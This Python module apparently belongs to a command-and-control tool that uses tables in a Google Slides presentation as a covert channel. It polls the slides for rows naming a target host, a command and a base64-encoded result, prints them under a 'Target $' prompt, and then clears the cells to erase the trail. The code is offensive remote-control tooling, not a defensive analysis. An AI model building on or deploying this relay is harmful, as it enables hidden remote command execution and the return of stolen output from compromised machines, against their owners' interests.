import threading
import time
from google.oauth2 import service_account
from googleapiclient.discovery import build
import base64
from modules.config import service_account_info, sleep_time
from modules.utils import get_current_date_time, generate_hash_md5, execute_command
from modules.google_services import insert_text_into_cell, replace_text_in_cell
from colorama import Fore, Back, Style

def background_task(credentials, presentation_id):
    service = build('slides', 'v1', credentials=credentials)
    while True:
        try:
            presentation = service.presentations().get(presentationId=presentation_id).execute()
            for slide in presentation.get('slides', []):
                for elem in slide.get('pageElements', []):
                    if 'table' in elem:
                        table_id = elem['objectId']
                        table = elem['table']
                        for row_index, row in enumerate(table['tableRows']):
                            first_cell_text = ''.join([text_element['textRun']['content']
                                                       for text_element in row['tableCells'][0].get('text', {}).get('textElements', [])
                                                       if 'textRun' in text_element]).strip()
                            second_cell_text = ''.join([text_element['textRun']['content']
                                                        for text_element in row['tableCells'][1].get('text', {}).get('textElements', [])
                                                        if 'textRun' in text_element]).strip()
                            third_cell_text = ''.join([text_element['textRun']['content']
                                                       for text_element in row['tableCells'][2].get('text', {}).get('textElements', [])
                                                       if 'textRun' in text_element]).strip()
                            if first_cell_text and second_cell_text and third_cell_text:
                                print(Fore.LIGHTBLACK_EX+Style.BRIGHT+"\nExecution on:"+Fore.WHITE+" "+first_cell_text+Fore.RED+" $"+Style.RESET_ALL)
                                print(f"{second_cell_text}")
                                print(Fore.LIGHTBLACK_EX+Style.BRIGHT+"\nResult:"+Style.RESET_ALL+base64.b64decode(third_cell_text).decode('utf-8', 'ignore'))
                                print(Fore.GREEN+Style.BRIGHT+"Target"+Fore.RED+" $"+Style.RESET_ALL)
                                replace_text_in_cell(service, presentation_id, table_id, row_index, 2, "")
                                replace_text_in_cell(service, presentation_id, table_id, row_index, 1, "")
                                replace_text_in_cell(service, presentation_id, table_id, row_index, 0, "")
            time.sleep(sleep_time)
        except Exception as e:
            print(f"An error occurred: {e}")
            time.sleep(sleep_time)